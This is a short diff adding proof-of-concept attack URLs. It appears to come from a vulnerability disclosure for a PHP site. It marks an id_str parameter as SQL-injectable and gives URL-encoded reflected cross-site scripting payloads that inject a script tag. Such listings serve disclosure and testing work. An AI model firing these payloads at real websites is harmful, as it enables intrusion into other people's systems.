@@ -1,0 +1,5 @@
+
+http://www.example.com/index.php?id_str=[SQLi]
+http://www.example.com/a_index.php?id_str=[SQLi]
+http://www.example.com/index.php?id_str=&#039;%22%3E%3Cscript%3Ealert(0x000024)%3C/script%3E
+http://www.example.com/a_index.php?id_str=&#039;%22%3E%3Cscript%3Ealert(0x000024)%3C/script%3E
